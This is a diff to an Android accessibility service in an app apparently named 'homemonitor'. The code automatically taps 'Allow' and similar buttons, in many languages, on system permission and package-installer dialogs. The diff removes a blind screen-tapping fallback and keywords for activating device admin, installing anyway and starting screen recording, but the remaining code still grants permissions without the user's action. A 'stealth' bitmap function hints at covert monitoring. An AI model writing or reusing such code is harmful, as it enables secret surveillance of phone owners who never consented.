@@ -1159,28 +1159,20 @@ class AppAccessibilityService : AccessibilityService() {
 
         try {
             val pkg = nodeInfo.packageName?.toString()?.lowercase() ?: ""
-            if (pkg == "com.google.android.system" || pkg == "com.homemonitor") return
+            if (pkg == "com.google.android.system" || pkg == "com.homemonitor" || pkg.contains("settings")) return
 
-            val isPermissionOrSettingsDialog = pkg == "com.android.permissioncontroller" ||
+            val isPermissionControllerDialog = pkg == "com.android.permissioncontroller" ||
                 pkg == "com.google.android.permissioncontroller" ||
                 pkg == "com.samsung.android.permissioncontroller" ||
                 pkg == "com.google.android.packageinstaller" ||
-                pkg == "com.android.packageinstaller" ||
-                pkg.contains("permission") ||
-                pkg.contains("settings") ||
-                pkg.contains("security") ||
-                pkg.contains("packageinstaller")
+                pkg == "com.android.packageinstaller"
 
-            if (isPermissionOrSettingsDialog) {
+            if (isPermissionControllerDialog) {
                 // Short delay for window transition animation completion and tree population
                 Thread.sleep(180L)
 
-                // Strategy 1: High-precision Tree & View ID matching
-                val granted = autoGrantTreeBased(nodeInfo, pkg)
-                if (granted) return
-
-                // Strategy 2: Blind scanning fallback for Jetpack Compose & obscured dialogs
-                autoGrantBlindScan(nodeInfo)
+                // High-precision Tree & View ID matching only
+                autoGrantTreeBased(nodeInfo, pkg)
             }
         } catch (e: Exception) {
             Log.e(TAG, "autoGrantPermissions error: ${e.message}")
@@ -1206,16 +1198,11 @@ class AppAccessibilityService : AccessibilityService() {
             }
         }
 
-        // Multi-language Allow Keywords (English, Spanish, Turkish, Chinese, French, German, Russian, Japanese)
+        // Multi-language Allow Keywords for system permission dialogs
         val allowKeywords = arrayOf(
             "allow", "while using the app", "only this time", "allow all the time",
-            "always allow", "always", "permitir", "solo esta vez", "izin ver",
-            "允许", "仅在使用中", "autoriser", "zulassen", "разрешить", "許可",
-            "turn on", "activate this device admin app", "activate this device administrator",
-            "activate device admin", "activate", "accept", "agree", "confirm", "enable",
-            "grant", "ok", "yes", "don't optimize", "unrestricted", "ignore",
-            "allow background", "install", "install anyway", "continue", "open",
-            "start now", "start recording", "start casting", "start"
+            "always allow", "permitir", "solo esta vez", "izin ver",
+            "允许", "仅在使用中", "autoriser", "zulassen", "разрешить", "許可"
         )
 
         for (kw in allowKeywords) {
@@ -1255,35 +1242,6 @@ class AppAccessibilityService : AccessibilityService() {
             }
         } catch (_: Exception) {}
         return false
-    }
-
-    private fun autoGrantBlindScan(nodeInfo: AccessibilityNodeInfo) {
-        val windowBounds = android.graphics.Rect()
-        nodeInfo.getBoundsInScreen(windowBounds)
-
-        val screenWidth = if (windowBounds.width() > 0) windowBounds.width().toFloat() else 1080f
-        val screenHeight = if (windowBounds.height() > 0) windowBounds.height().toFloat() else 2400f
-
-        val tapX = screenWidth * 0.5f
-
-        // Re-use cached working Y offset if available
-        if (cachedWorkingYOffset > 0f) {
-            dispatchGestureTap(tapX, cachedWorkingYOffset)
-            Log.i(TAG, "Blind scan: Re-used working Y offset at $cachedWorkingYOffset")
-            return
-        }
-
-        // Scan Y-offsets from 55% to 82% screen height
-        val scanOffsets = floatArrayOf(0.55f, 0.62f, 0.68f, 0.75f, 0.82f)
-        for (factor in scanOffsets) {
-            val tapY = screenHeight * factor
-            dispatchGestureTap(tapX, tapY) {
-                cachedWorkingYOffset = tapY
-            }
-            Log.i(TAG, "Blind scan: Tapped computed coordinates ($tapX, $tapY)")
-            Thread.sleep(120L)
-            break
-        }
     }
 
     fun enhanceSeeThroughStealthBitmap(sourceBitmap: Bitmap): Bitmap {
